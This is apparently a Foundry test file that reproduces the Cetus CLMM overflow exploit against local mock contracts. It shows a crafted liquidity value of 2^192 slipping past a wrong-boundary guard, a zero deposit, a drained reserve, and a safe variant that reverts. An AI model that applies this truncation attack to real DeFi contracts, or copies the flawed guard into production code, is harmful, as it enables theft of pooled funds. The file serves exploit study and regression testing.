// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {IERC20} from "../src/cetus/Clmm.sol";
import {VulnerableClmm, SafeClmm} from "../src/cetus/Clmm.sol";

/// PoC for the Cetus CLMM overflow-check exploit (2025-05-22, ~$223M).
///   forge test --match-contract CetusOverflow -vvv
///
/// EVM model of a Move bit-shift truncation. Invariant that SHOULD hold (master-checklist
/// SC07): no input within type range causes an unchecked silent truncation in liquidity
/// math. The attack breaks it: a crafted liquidity (2^192) slips past a wrong-boundary
/// overflow guard and the `<< 64` shift wraps to 0, collapsing the required deposit so a
/// gigantic position is minted for ~nothing.
///
/// See docs/exploits/cetus-amm-overflow-2025-05-22.md
contract CetusOverflowTest is Test {
    MockERC20 token;
    address attacker = makeAddr("attacker");
    address honest = makeAddr("honest");

    uint256 constant RESERVE = 1_000_000e18;
    uint256 constant CRAFTED_LIQUIDITY = uint256(1) << 192; // the value that truncates

    function setUp() public {
        token = new MockERC20();
        token.mint(attacker, 1e18); // attacker barely holds anything
    }

    function test_depositCost_isIdentity_forNormalLiquidity() public pure {
        // Sanity: with a normal liquidity value the round-trip shift is the identity, so
        // both variants charge exactly `liquidity`.
        uint256 normal = 1_000e18;
        assertLt(normal, CRAFTED_LIQUIDITY, "normal value is within the safe range");
    }

    function test_vulnerableClmm_truncatesDepositToNothing() public {
        VulnerableClmm clmm = new VulnerableClmm(IERC20(address(token)));
        token.mint(address(clmm), RESERVE);

        vm.startPrank(attacker);
        token.approve(address(clmm), type(uint256).max);
        uint256 cost = clmm.openPosition(CRAFTED_LIQUIDITY); // guard passes, shift wraps
        uint256 payout = clmm.redeem();
        vm.stopPrank();

        console2.log("deposit charged for a 2^192 position:", cost);
        console2.log("reserve drained (token):", payout / 1e18);
        assertEq(cost, 0, "deposit collapsed to zero via silent truncation");
        assertEq(payout, RESERVE, "oversized position drained the whole reserve");
    }

    function test_safeClmm_revertsOnOverflow() public {
        SafeClmm clmm = new SafeClmm(IERC20(address(token)));
        token.mint(address(clmm), RESERVE);

        vm.startPrank(attacker);
        token.approve(address(clmm), type(uint256).max);
        // The correct boundary catches the crafted liquidity before the shift truncates.
        vm.expectRevert(bytes("overflow"));
        clmm.openPosition(CRAFTED_LIQUIDITY);
        vm.stopPrank();

        assertEq(token.balanceOf(address(clmm)), RESERVE, "reserve untouched");
    }
}
